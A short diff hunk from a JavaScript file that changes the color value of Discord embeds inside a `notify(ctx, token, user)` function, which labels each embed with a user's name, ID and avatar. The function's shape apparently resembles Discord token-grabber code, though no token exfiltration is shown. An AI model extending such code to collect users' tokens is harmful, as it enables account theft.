@@ -291,7 +291,7 @@ const notify = async (ctx, token, user) => {
     });
 
     ctx.embeds.forEach(embed => {
-        embed.color = 2550000;
+        embed.color = 16711680;
         embed.author = {
             name: `${user.username} | ${user.id}`,
             icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
